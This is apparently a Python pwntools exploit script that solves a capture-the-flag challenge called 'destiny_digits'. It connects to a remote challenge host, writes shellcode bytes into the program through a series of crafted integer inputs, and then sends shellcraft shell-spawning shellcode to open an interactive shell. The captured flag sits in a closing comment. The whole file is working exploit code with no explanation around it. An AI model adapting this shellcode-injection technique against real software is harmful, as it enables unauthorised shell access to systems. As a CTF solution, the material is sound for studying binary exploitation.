#!/usr/bin/python3

from pwn import *

exe = ELF('destiny_digits', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*peek_at_destiny+180
                b*main+527
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('flu.xxx', 10110)
else:
        p = process(exe.path)

GDB()
payload = "\x5E\x5E\x5E\x5A\xB0\x00\x66\xBA\xC0\x00\x0F\x05"
for s in range(0, 3):
        sla(b'? ', str(u32(payload[s*4:s*4+4])))
for s in range(0, 127-2):
        sla(b'? ', str(0xffffffff))
input()
sl(b'a'*0x32 + asm(shellcraft.sh()))
p.interactive()
# flag{y0ur_dest1ny_r3ally_is_in_y0ur_0wn_h4nds}